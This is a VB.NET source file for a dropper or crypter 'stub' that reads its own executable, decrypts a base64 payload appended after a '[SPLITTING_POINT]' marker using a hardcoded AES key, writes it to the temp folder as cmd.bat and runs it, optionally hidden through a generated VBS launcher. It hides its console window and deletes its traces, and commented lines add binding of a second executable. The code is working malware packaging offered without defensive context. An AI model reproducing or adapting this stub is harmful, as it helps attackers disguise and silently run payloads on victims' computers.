Imports System
Imports System.IO
Imports System.AppDomain
Imports System.Diagnostics
Imports Microsoft.VisualBasic

Module stub

    Private Declare Auto Function GetConsoleWindow Lib "kernel32.dll" () As IntPtr
    Private Declare Auto Function ShowWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean

    Private Const SW_HIDE As Integer = 0
    Private Const SW_SHOW As Integer = 5

    Sub Main()
        Dim hiddenmode As Boolean = False
        Dim hWndConsole As Integer
        hWndConsole = GetConsoleWindow()
        ShowWindow(hWndConsole, SW_HIDE)

        Try
            Dim exepath As String = AppDomain.CurrentDomain.BaseDirectory + Process.GetCurrentProcess.ProcessName + ".exe"
            Dim tempdir As String = My.Computer.FileSystem.SpecialDirectories.Temp
            'For exe path
            Dim SP() As String = Split(System.IO.File.ReadAllText(exepath), "[SPLITTING_POINT]")
            Dim batchf As Byte() = unsecure(Convert.FromBase64String(SP(1)))
            '[BDPROC]Dim bindedf As Byte() = unsecure(Convert.FromBase64String(SP(3)))
            My.Computer.FileSystem.WriteAllBytes(tempdir & "\cmd.bat", batchf, False)
            '[BDPROC]My.Computer.FileSystem.WriteAllBytes(tempdir & "\" & SP(2), bindedf, False)
            If hiddenmode = True Then
                Dim vbwriter As New IO.StreamWriter(tempdir + "\" + "start.vbs")
                vbwriter.WriteLine("set objShell = CreateObject(""WScript.Shell"")")
                vbwriter.WriteLine("objShell.Run """ + tempdir + "\cmd.bat"", vbHide, TRUE")
                vbwriter.Close()

                ' run program
                Dim ps As ProcessStartInfo
                Dim psname As String = (tempdir & "\" & "start.vbs")
                ps = New ProcessStartInfo(psname)
                Dim proc As New Process()
                proc.StartInfo = ps
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                proc.Start()
                proc.WaitForExit()
                File.Delete(psname)
                File.Delete(tempdir & "\" & "cmd.bat")
            Else
                Dim ps As ProcessStartInfo
                Dim psname As String = (tempdir & "\" & "cmd.bat")
                ps = New ProcessStartInfo(psname)
                Dim proc As New Process()
                proc.StartInfo = ps
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal
                proc.Start()
                proc.WaitForExit()
                File.Delete(psname)
            End If
            '[BDPROC]Process.Start(tempdir & "\" & SP(2))
        Catch ex As Exception
            Process.GetCurrentProcess.Kill()
        End Try
        Process.GetCurrentProcess.Kill()

    End Sub

    Function unsecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 9, 2, 8, 3, 7, 4, 5, 6, 0, 1, 4, 3, 0, 0, 7}
            SA.Key = New Byte() {7, 0, 0, 3, 4, 1, 0, 6, 5, 4, 7, 3, 8, 2, 9, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function

End Module